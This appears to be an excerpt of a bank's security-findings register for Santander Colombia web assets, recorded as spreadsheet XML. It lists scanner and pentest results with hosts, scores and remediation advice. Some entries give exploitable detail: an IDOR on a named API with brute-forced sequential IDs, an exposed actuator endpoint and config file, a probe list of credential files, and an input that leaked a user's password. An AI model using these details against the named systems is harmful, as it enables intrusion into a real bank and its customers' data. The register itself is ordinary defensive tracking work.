    <s v="Se recomienda implementar mecanismos de prevención contra ataques de fuerza bruta, como el bloqueo de la cuenta de usuarios tras un número de intentos erróneos o soluciones de seguridad como captchas."/>
    <s v="Es posible que un atacante pueda ganar acceso a una cuenta realizando un ataque de fuerza bruta mediante un ataque de diccionario."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="252"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-f6f4c0db-9637-4e7a-944c-9d38f8a580c5"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <m/>
    <m/>
    <d v="2023-12-02T00:00:00"/>
    <n v="934"/>
    <d v="2024-03-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-11T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web._x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2f.svn%2fentries"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <s v="Sin definir"/>
    <s v="falso positivo_x000a_RITM011127883"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="253"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-6568b43e2f03616c9296d29b"/>
    <s v="CO-23-CNMPO-011-CO-001"/>
    <x v="131"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-11-30T00:00:00"/>
    <n v="936"/>
    <d v="2024-03-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-02-04T00:00:00"/>
    <s v="Se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta la cabecera &quot;Strict-Transport-Security&quot;, la cual fuerza el uso de la política HSTS y, por lo tanto, no fuerza al navegador a comunicarse únicamente mediante canales cifrados HTTPS."/>
    <s v="Se recomienda la configuración del servidor remoto para que en las cabeceras de respuesta se incluya la cabecera HSTS incluyendo un período de validez estimado de la política en el propio navegador. https://docs.microsoft.com/en-us/iis/get-started/whats-new-in-iis-10-version-1709/iis-10-version-1709-hsts"/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web y forzarle a utilizar HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto plano y, por tanto, dejarían expuestos datos sensibles o contraseñas. Dada la situación, el robo de datos y el secuestro de sesión es altamente probable."/>
    <s v="1° Fecha: 24/02/2024_x000a_2: Fecha: 31/07/2024"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="254"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MAN-661fbd2d8f819f39594a8627"/>
    <s v="CO-24-CNMPO-001-AP-001"/>
    <x v="132"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.2"/>
    <s v="CVE-2021-41182:_x000a_CVE-2021-41184:_x000a_CVE-2021-41183:_x000a_CVE-2022-31160:_x000a_CVE-2011-4969:_x000a_CVE-2012-6708:_x000a_CVE-2020-7656:_x000a_CVE-2015-9251_x000a_CVE-2019-11358_x000a_CVE-2020-11023_x000a_CVE-2020-11022"/>
    <m/>
    <s v="https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f"/>
    <m/>
    <m/>
    <d v="2024-04-11T00:00:00"/>
    <n v="803"/>
    <d v="2024-07-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-07-30T00:00:00"/>
    <s v="Se ha detectado la versión 1.12.1 de jquery-ui_x000a_Se ha detectado la versión 1.4.2 de jquery_x000a_Si bien esta versión está Obsoleta, y ha sido identificada en la aplicación, no se ha observado que se haga uso de ella, ya que se hace uso de la versión 3.4.1 indicada como vulnerable en informes previos de auditoría."/>
    <s v="En primer lugar, se recomienda actualizar los activos afectados a la última versión disponible sin vulnerabilidades conocidas. Es caso de no ser posible, se deberán aplicar todos los parches disponibles con el objeto de minimizar el riesgo asociado a la vulnerabilidad."/>
    <s v="El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante vulnerabilidades conocidas poniendo en riesgo el activo afectado."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="255"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="133"/>
    <m/>
    <s v="Active"/>
    <x v="6"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2023-08-30T00:00:00"/>
    <n v="1028"/>
    <s v=""/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Validación de medidas de seguridad como ISR y CSP para garantizar que no se incluye ningún recurso remoto malicioso en una aplicación web._x000a__x000a_Refused to load the script 'https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;cx=c&amp;_slc=1' because it violates the following Content Security Policy directive: &quot;script-src 'self' https://www.google-analytics.com 'unsafe-hashes' 'sha256-Mejfqw/rcuPAXLq+LvRkhI5YwxTF3F/V3Hx9uU7Cem0=' 'sha256-qN1ztfNu7xgEFHo8+X4eI8Ing1P9bO1CzFk3xCQfgkQ=' 'sha256-Q+qomrZ1pEZHeC01QESfHKnCjnzuW+wS64SJ94cd7eU=' 'sha256-lvvj5Y94uJd2owx4udhFH/Ovi2qOZxmnruIlF+TAd9w=' 'sha256-xrczspkw95tQ1dAcwlL1jSgCnxmmVSUklZ9Q6ohZfYI=' 'sha256-BihYdWDxuuHcPK9cVceix+MuRiw3AROVh7pc+mApIH0=' 'sha256-d90TvGS55n09UiJAhzG6xGjF3Gm9YH4umQycQSq76Oc=' 'sha256-KXuYyfHKAftAQdoBsibeqApF9skaF/wmnM4QcNpzhrY=' 'sha256-B+z+r+8poOlpRTA/5UTc9+ba09cP1IGA/gg0KhnWi48=' 'sha256-vI7fz2T0edVoCOfHGv9KsWni/5c1l39ZabC41RzA7HE=' 'sha256-QjzI5L7Hnq+9D3fw7EdfQiOVj26uHNgDHNbNjTgJpw8=' 'sha256-BBobMUbBLQ1n63cvVz77C1RTv9OLoISg6uv85pDAIGQ=' 'sha256-4DBs4D/nRR0L4zmUqqrJ1/CO0yjEN3CeJhHMdv+FwgE=' 'sha256-n5uSXQWDGoSegGiEaJlavk0NhyLhhQXyfzIFUctJ930=' 'sha25..._x000a__x000a__x000a_Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src 'self' https://www.google-analytics.com 'unsafe-hashes' 'sha256-Mejfqw/rcuPAXLq+LvRkhI5YwxTF3F/V3Hx9uU7Cem0=' 'sha256-qN1ztfNu7xgEFHo8+X4eI8Ing1P9bO1CzFk3xCQfgkQ=' 'sha256-Q+qomrZ1pEZHeC01QESfHKnCjnzuW+wS64SJ94cd7eU=' 'sha256-lvvj5Y94uJd2owx4udhFH/Ovi2qOZxmnruIlF+TAd9w=' 'sha256-xrczspkw95tQ1dAcwlL1jSgCnxmmVSUklZ9Q6ohZfYI=' 'sha256-BihYdWDxuuHcPK9cVceix+MuRiw3AROVh7pc+mApIH0=' 'sha256-d90TvGS55n09UiJAhzG6xGjF3Gm9YH4umQycQSq76Oc=' 'sha256-KXuYyfHKAftAQdoBsibeqApF9skaF/wmnM4QcNpzhrY=' 'sha256-B+z+r+8poOlpRTA/5UTc9+ba09cP1IGA/gg0KhnWi48=' 'sha256-vI7fz2T0edVoCOfHGv9KsWni/5c1l39ZabC41RzA7HE=' 'sha256-QjzI5L7Hnq+9D3fw7EdfQiOVj26uHNgDHNbNjTgJpw8=' 'sha256-BBobMUbBLQ1n63cvVz77C1RTv9OLoISg6uv85pDAIGQ=' 'sha256-4DBs4D/nRR0L4zmUqqrJ1/CO0yjEN3CeJhHMdv+FwgE=' 'sha256-n5uSXQWDGoSegGiEaJlavk0NhyLhhQXyfzIFUctJ930=' 'sha256-v4JClfcQS+AyJ6vwkfElMQAUFRqmgGaShAa/YLtBWvE=' 'sha256-Isf+HG1uL..._x000a__x000a__x000a_Refused to load the script 'https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;l=dataLayer&amp;cx=c' because it violates the following Content Security Policy directive: &quot;script-src 'self' https://www.google-analytics.com 'unsafe-hashes' 'sha256-Mejfqw/rcuPAXLq+LvRkhI5YwxTF3F/V3Hx9uU7Cem0=' 'sha256-qN1ztfNu7xgEFHo8+X4eI8Ing1P9bO1CzFk3xCQfgkQ=' 'sha256-Q+qomrZ1pEZHeC01QESfHKnCjnzuW+wS64SJ94cd7eU=' 'sha256-lvvj5Y94uJd2owx4udhFH/Ovi2qOZxmnruIlF+TAd9w=' 'sha256-xrczspkw95tQ1dAcwlL1jSgCnxmmVSUklZ9Q6ohZfYI=' 'sha256-BihYdWDxuuHcPK9cVceix+MuRiw3AROVh7pc+mApIH0=' 'sha256-d90TvGS55n09UiJAhzG6xGjF3Gm9YH4umQycQSq76Oc=' 'sha256-KXuYyfHKAftAQdoBsibeqApF9skaF/wmnM4QcNpzhrY=' 'sha256-B+z+r+8poOlpRTA/5UTc9+ba09cP1IGA/gg0KhnWi48=' 'sha256-vI7fz2T0edVoCOfHGv9KsWni/5c1l39ZabC41RzA7HE=' 'sha256-QjzI5L7Hnq+9D3fw7EdfQiOVj26uHNgDHNbNjTgJpw8=' 'sha256-BBobMUbBLQ1n63cvVz77C1RTv9OLoISg6uv85pDAIGQ=' 'sha256-4DBs4D/nRR0L4zmUqqrJ1/CO0yjEN3CeJhHMdv+FwgE=' 'sha256-n5uSXQWDGoSegGiEaJlavk0NhyLhhQXyfzIFUctJ930=' '..."/>
    <s v="Los propietarios de sitios web deben revisar sus sitios en busca de mensajes de violación de CSP. Estos mensajes suelen indicar que el sitio está intentando cargar recursos externos desconocidos o no verificados. Encontrará información detallada sobre estas infracciones en la sección de detalles de las pruebas._x000a__x000a_Solución: debe bloquear los llamados a recursos externos"/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 09/08/2024_x000a_2° Fecha: 02/09/2024_x000a_Pro:_x000a_1° Fecha: 14/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="256"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="134"/>
    <m/>
    <s v="Active"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2023-10-22T00:00:00"/>
    <n v="975"/>
    <d v="2024-02-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Una Política de Seguridad de Contenidos (CSP) correctamente configurada puede ayudar a prevenir ataques de cross-site scripting (XSS) restringiendo los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería Implementar directivas que establezcan restricciones de origen válidas desde donde el cliente puede cargar marcos y scripts, así como limitar donde el cliente puede enviar datos de formularios. Restringir plugins y especificar un recurso válido para informar de violaciones de la política. No contener palabras clave &quot;inseguras&quot; ni incluir comodines que sean ineficaces para restringir fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena Política de Seguridad de Contenidos, que es prevenir los ataques de Cross Site Scripting y de inyección de contenido dinámico._x000a__x000a__x000a_script-src"/>
    <s v="Recomendamos revisar el CSP de cada sitio Web de forma que sea eficaz a la hora de cumplir los objetivos de seguridad definidos para la Política de Seguridad de Contenidos, tales como: Impedir la carga de recursos de contenido y scripts no autorizados. Impedir el clickjacking y otros ataques de marcos anidados. Garantizar que los formularios web y los enlaces se comportan según lo previsto. Específicamente para esta evaluación, nos estamos centrando principalmente en la prevención de ataques de Cross Site Scripting. Por lo tanto, para obtener una BUENA calificación, basta con: Implementar directivas que establezcan restricciones de fuente válidas y completas para la carga de contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas permitidas basadas en host o esquemas de URL vacíos como &quot;HTTP&quot; en las directivas fuente._x000a__x000a_Las listas de permisos de host pueden eludirse con frecuencia. Considere el uso de 'strict-dynamic' en combinación con CSP nonces o hashes."/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 30/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 28/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="257"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="135"/>
    <m/>
    <s v="Active"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2023-08-30T00:00:00"/>
    <n v="1028"/>
    <d v="2023-12-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página no incluye un atributo de integridad en la obtención de scripts entre dominios._x000a__x000a_https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;l=dataLayer&amp;cx=c: Falta el atributo de integridad_x000a__x000a__x000a_https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;cx=c&amp;_slc=1: Falta el atributo de integridad_x000a__x000a_//www.google-analytics.com/analytics.js: Falta el atributo de integridad"/>
    <s v="Los propietarios de sitios web deben evitar cargar secuencias de comandos de recursos de terceros, para no exponerse a la manipulación de contenidos y JavaScript por parte de terceros o en caso de que la red se vea comprometida. Si la carga de scripts de terceros es inevitable, deben utilizarse etiquetas de integridad de subrecursos siempre que sea posible. Para más información, consulte:_x000a__x000a_https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity"/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 30/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 28/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="258"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="136"/>
    <m/>
    <s v="Active"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2023-02-14T00:00:00"/>
    <n v="1225"/>
    <d v="2023-06-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Esta Content-Security-Policy (CSP) tiene problemas que posiblemente la hacen insegura._x000a__x000a_La implementación de estos encabezados no sigue las mejores prácticas de seguridad._x000a__x000a_Content-Security-Policy:_x000a__x000a_reporting-objective: No se utiliza ninguna directiva de información_x000a_form-action-objective: Limitación del privilegio de solicitud (Formulario-Acciones)_x000a_code-injection-objective: Prevención limitada de la inyección de código_x000a_default-src: Falta default-src"/>
    <s v="Elimine cualquier instancia de directivas &quot;unsafe-&quot; y fuentes &quot;blob, data, filesystem&quot;. Asegúrese de que sus directivas CSP están correctamente configuradas._x000a__x000a_Asegúrese de que sus cabeceras se implementan correctamente, como se indica en RFC-7231. Sus cabeceras no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente._x000a__x000a_reporting-objective: Incluir una directiva de notificación con una ubicación o grupo válidos._x000a_form-action-objective: Incluya la directiva form-actions en su CSP._x000a_code-injection-objective: No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para cualquier directiva de la lista de fuentes._x000a_default-src: Utilice la directiva default-src en su Content-Security-Policy (CSP), tal y como se especifica en W3C CSP._x000a__x000a_https://www.w3.org/TR/CSP/_x000a__x000a_https://datatracker.ietf.org/doc/html/rfc7231"/>
    <m/>
    <s v="Pre:_x000a_1° Fecha: 30/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 28/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="259"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="DNS"/>
    <m/>
    <m/>
    <x v="137"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.97.34"/>
    <m/>
    <n v="53"/>
    <m/>
    <d v="2024-04-16T00:00:00"/>
    <n v="798"/>
    <d v="2024-07-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <s v="27/'4/2024"/>
    <s v="No es intrínsecamente arriesgado exponer un servidor DNS, que traduce nombres de dominio, como ejemplo.com, en direcciones IP que los navegadores utilizan para encontrar y acceder a sitios web. La mayoría de los operadores de red ayudan a la navegación web pública con servidores DNS orientados a Internet. Un servidor DNS mal configurado, sin embargo, puede ser vulnerable a una redirección maliciosa de la web R o a un ataque de denegación de servicio distribuido (DDoS), en el que un atacante inunda los servidores DNS de un dominio para interrumpir la resolución DNS para ese dominio."/>
    <s v="Realice una auditoría de seguridad de la configuración de su servidor DNS y aplique los controles necesarios, como un cortafuegos o extensiones de seguridad DNS."/>
    <m/>
    <m/>
    <m/>
    <s v="Jorge Arturo Guzman Sanchez"/>
  </r>
  <r>
    <n v="260"/>
    <s v="BSNC"/>
    <s v="ASM-Pentesting"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="SSO Prospera"/>
    <s v="ASM-190424-0012"/>
    <m/>
    <x v="138"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="https://sso-management.servicios.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-04-19T00:00:00"/>
    <n v="795"/>
    <d v="2024-05-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-08-13T00:00:00"/>
    <s v="Spring Boot incluye una serie de características adicionales llamadas actuadores para ayudar a supervisar y controlar una aplicación cuando se empuja a la producción. Los actuadores permiten controlar y supervisar una aplicación utilizando puntos finales HTTP o JMX. La auditoría, la salud y la recopilación de métricas también pueden abrir una puerta oculta al servidor si se ha configurado mal una aplicación._x000a__x000a_https://sso-management.servicios.santanderconsumer.co/actuator"/>
    <s v="Los puntos finales pueden personalizarse mediante las propiedades de Spring. Puede cambiar si un endpoint Por defecto, todos los endpoints excepto shutdown están habilitados. Si prefiere habilitar específicamente un endpoint puede utilizar la propiedad endpoints.enabledpoint está habilitado, si se considera sensible e incluso su id. Del mismo modo, también puede optar por establecer globalmente la bandera &quot;sensible&quot; de todos los puntos finales."/>
    <m/>
    <m/>
    <s v="Esacalada: 24/04/2024_x000a_Certificada"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="261"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="139"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-04-22T00:00:00"/>
    <n v="792"/>
    <d v="2024-08-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-29T00:00:00"/>
    <s v="Los registros del navegador hacen referencia a los mensajes o la información generada por los scripts o los procesos back-end de un sitio web que se envían directamente a la consola del navegador. Estos registros suelen incluir información de depuración, mensajes de error, advertencias u otros resultados de diagnóstico que los desarrolladores y usuarios utilizan para solucionar problemas."/>
    <s v="- Limite los registros del navegador a la información de diagnóstico esencial._x000a_- Evite registrar datos sensibles como credenciales de usuario o información personal identificable._x000a_- Implemente controles para restringir el acceso a los registros del navegador únicamente al personal autorizado._x000a_- Utilice técnicas de cifrado u ofuscación para proteger la información confidencial de los registros._x000a_- Revise y controle regularmente los registros del navegador para detectar cualquier actividad inusual o sospechosa."/>
    <s v="El riesgo de emitir registros del navegador reside en la potencial exposición de información sensible a partes no autorizadas. Estos registros pueden revelar inadvertidamente credenciales de usuario, información de identificación personal u otros datos confidenciales, que pueden ser explotados por actores maliciosos para el robo de identidad, fraude u otros fines nefastos. Además, exponer detalles internos del sistema o mensajes de error puede proporcionar a los atacantes información sobre posibles vulnerabilidades o puntos débiles en la infraestructura del sitio web."/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="262"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="140"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-04-22T00:00:00"/>
    <n v="792"/>
    <d v="2024-08-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-29T00:00:00"/>
    <s v="Los componentes de un sitio web incluyen diferentes elementos que contribuyen colectivamente a la estructura, apariencia y funcionalidad de una página web. Estos componentes incluyen contenido textual, imágenes, hojas de estilo que definen la maquetación y el diseño, scripts que permiten la interactividad, archivos multimedia, fuentes para la tipografía, menús de navegación, formularios para las entradas del usuario y widgets o plugins para funcionalidades adicionales. Juntos, estos componentes crean una experiencia de usuario cohesionada, facilitando la navegación, la interacción y la difusión de información en el sitio web. Cada componente desempeña un papel vital en la difusión de contenidos, la mejora del atractivo visual y la participación del usuario._x000a__x000a_Path: www.santander.com.co/img/sep_head_btns.png"/>
    <s v="- Optimice la distribución de componentes minimizando el tamaño de los archivos y aprovechando las técnicas de almacenamiento en caché._x000a_- Utilice redes de distribución de contenidos (CDN) para distribuir los componentes y mejorar la velocidad de carga._x000a_- Implemente sólidos mecanismos de gestión de errores para gestionar con elegancia los fallos de carga de los componentes._x000a_- Utilice opciones alternativas o contenidos alternativos para los componentes críticos, con el fin de garantizar una experiencia de usuario fluida, incluso en caso de fallos de carga._x000a_- Supervise regularmente el rendimiento del sitio web y realice pruebas en distintos dispositivos y condiciones de red."/>
    <s v="Cuando componentes esenciales como imágenes, hojas de estilo, secuencias de comandos o contenido multimedia no se cargan, los diseños pueden quedar rotos, las funciones incompletas y la interactividad reducida. Esto provoca frustración en los usuarios y una posible pérdida de compromiso. Además, puede afectar negativamente a la credibilidad del sitio web, la percepción de la marca y las tasas de conversión, ya que los usuarios pueden percibirlo como poco fiable o poco profesional."/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="263"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-fe02b06b-7a4e-4200-944f-26a6b7c0655d"/>
    <m/>
    <x v="141"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-04-26T00:00:00"/>
    <n v="788"/>
    <d v="2024-07-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-04-26T00:00:00"/>
    <s v="Se descubrió un archivo potencialmente confidencial en el servidor web. Este archivo puede o no estar asociado directamente con la aplicación web._x000a_Archivos comprobados:_x000a_nginx.conf, .htpasswd, key.pem, certificado.pem, httpd.conf, despliegue.yaml, servicio.yaml, my.cnf, mysql.ini, postgresql.conf, mongod.conf, squid.conf, squidGuard.conf, squidGuard.conf.template, haproxy.cfg, iptables.rules, claves_autorizadas_x000a__x000a_https://assets.cdt.santander.com.co/squidGuard.conf_x000a__x000a_Lógica de detección de QID:_x000a_este QID envía una solicitud GET al servidor de destino para recuperar el contenido del archivo."/>
    <s v="Verifique que se permita el acceso a este archivo. Si es necesario, elimínelo o aplique controles de acceso al archivo."/>
    <s v="El contenido de este archivo puede revelar información confidencial que podría brindarle a un atacante una ventaja técnica para obtener más información sobre su objetivo."/>
    <s v="Sin definir"/>
    <s v="Escalada: 30/04/2024"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="264"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-665045f6c382686af2c7f53a"/>
    <s v="CO-24-CNMPO-006-AP-001"/>
    <x v="142"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="api.stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <n v="760"/>
    <d v="2024-06-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-05-24T00:00:00"/>
    <s v="El aplicativo no realiza una correcta comprobación del acceso a los recursos del usuario en el Backend, pudiendo acceder un usuario de manera directa a información no legítima modificando el identificador que referencia al objeto que muestra la información accesible._x000a_En este caso particular, un usuario puede acceder de manera directa a los detalles de contratación del CDT a través de la URL https://api.stg.mb.cdt.santander.com.co/mb-apiprocess/v1/deposit/processes/4919/details modificando el identificador._x000a__x000a_Modificando el id que aparece en el GET es posible obtener los detalles de otros usuarios_x000a__x000a_El ID parece secuencial, por lo que se realizó un ataque_x000a_de fuerza bruta sobre el mismo, obteniendo un listado bastante amplio de IDs válidos"/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para_x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene_x000a_privilegios de acceso a la información consultada."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo_x000a_directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto._x000a_Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios,_x000a_archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera_x000a_previa. "/>
    <m/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="265"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-6641f46adafe1d62bb498323"/>
    <s v="CO-24-CNMPO-002-AP-001"/>
    <x v="143"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="6.8"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2024-05-13T00:00:00"/>
    <n v="771"/>
    <d v="2024-08-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un fallo de acceso por la aplicación a los valores del mantenimiento de la sesión,_x000a_que conllevan el uso de las preguntas de seguridad, y de la contraseña del usuario._x000a_Concretamente, esta vulnerabilidad se ha descubierto en el siguiente formulario:_x000a_• Funcionalidad: Confirming-&gt;Security Actions-&gt;Administrar Cuestionario de Seguridad-_x000a_&gt;seguridad.respuestas.preguntas.cuestionario.respuesta_x000a_• Parámetro: formularioRespPreg%3AtempRespuestaPreg1%3ArespuestaPreg1_x000a_• Payload: &amp;_x000a__x000a_el valor original de la primera respuesta es “AAAAA”_x000a__x000a_Se modifica el valor, se pulsa sobre el botón de guardado, y se intercepta la petición gracias a un proxy intermedio, pudiendo ver perfectamente los valores que se envían al servidor_x000a__x000a_Gracias al proxy, se puede paralizar y modificar la petición antes de ser enviada. En este caso, se modifica el valor “AAAAAb” por “&amp;”, obteniendo una respuesta correcta por parte del servidor_x000a__x000a_Internamente, esta acción genera algún error de asignación y de toma de valores de la BBDD que no se ha podido determinar, pero que concluye trayendo al campo modificado la contraseña actual del usuario logado_x000a__x000a_Se muestra un error con texto “value is required”, lo que muestra que hay un error entre el servidor y el FrontEnd, ya que aunque el campo esté relleno se requiere_x000a_que no se deje vacío._x000a_Al no estar sanitizada la entrada de este formulario por el Backend, muy probablemente el servidor esté interpretando que el payload introducido en esta clave-valor es otro separador adicional, conllevando a un comportamiento inesperado._x000a__x000a_Se ha detectado un fallo de lógica de negocio, ya que a la hora de modificar una contraseña en una cuenta logueada, ésta aparece “oculta” pero dentro del formulario, cuando debería ser solicitada para así confirmar que el usuario que está intentando modificar la cuenta no es un usuario malintencionado_x000a__x000a_Si bien aparece oculta, a la hora de ingresar cualquier otra nueva contraseña, se envía en texto plano 